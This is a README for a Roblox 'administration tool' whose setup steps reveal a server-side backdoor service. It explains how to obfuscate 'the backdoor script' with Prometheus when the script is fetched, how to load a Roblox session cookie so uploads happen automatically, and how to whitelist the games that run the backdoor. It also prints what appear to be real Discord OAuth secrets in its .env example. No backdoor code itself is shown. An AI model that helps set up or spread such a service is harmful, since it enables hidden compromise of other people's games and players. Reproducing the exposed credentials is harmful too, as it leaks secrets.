# 🎮 Roblox Administration Tool 
Nett Administration is an open-source admin program for Roblox, offering a wide array of features and commands to improve the experience for both players and developers.

[![GitHub license](https://img.shields.io/github/license/ghluka/roblox-ss)](LICENSE)

> Live demonstration available at [nett.wtf](https://nett.wtf).

## ⚙️ Running

```sh
# Ensure you're in the /src directory
$ cd src

# Install dependencies
$ pip install -r requirements.txt

# Run main script
$ python3 main.py
```

### 🪪 Auth Prerequisites

Before running the script, ensure that you have your `/src/.env` file populated,
it should look like this:

```sh
CLIENT_ID=1015334465989529701
CLIENT_SECRET=J7WXgwrmN4zD4D4P2Ncl9fZpj-vwrL-J
SECRET_KEY=d2e35fc7527b009550490b4e
```

Your CLIENT_ID and CLIENT_SECRET should be from a Discord Application's
OAuth2 client information.

<img width="1912" height="920" alt="msedge_5Rp4GPZ62g" src="https://github.com/user-attachments/assets/7c54dafd-fe1e-4679-8781-a54a9fb0944f"/>

And your SECRET_KEY can be anything, I used the code `os.urandom(12).hex()` to generate one.

### 🍪 Roblox Cookie

The script-hub functionality will prompt you to load a Roblox cookie to automatically upload any RBXMX files.

It's not necessary, but its highly recommended while running this service.

This will be prompted to you from the command line and will be stored in the file `cookie.pkl`.

### 🛡️ Prometheus Setup

Download [prometheus-windows.zip](https://github.com/prometheus-lua/Prometheus/releases/tag/v0.2.6) and put it in the [`/src/prometheus`](/src/prometheus) directory.

If Prometheus is present, then the backdoor script will be automatically obfuscated when fetched, otherwise it won't be obfuscated.

#### ⚙️ Editing Prometheus configuration

Edit the Prometheus configuration located in [`/src/prometheus/config.lua`](/src/prometheus/config.lua).

You can visit [Prometheus' configuration guide](https://levno-710.gitbook.io/prometheus/getting-started/writing-a-custom-config-file) if you don't know how to work with it already, however many features like Vmify do not work with vLua, so many sure you test your configuration before deploying it.

### 🛂 Game Review

Theres currently no game review panel, so you have to manually add `review.json` games to `games.json` in the [`/src/games`](/src/games) directory.

Games.json entries should be formatted like:
```json
{
    "1818": {
        "placeid": 1818,
        "universeid": 13058,
        "url": "https://www.roblox.com/games/1818",
        "whitelist": 1
    },
}
```
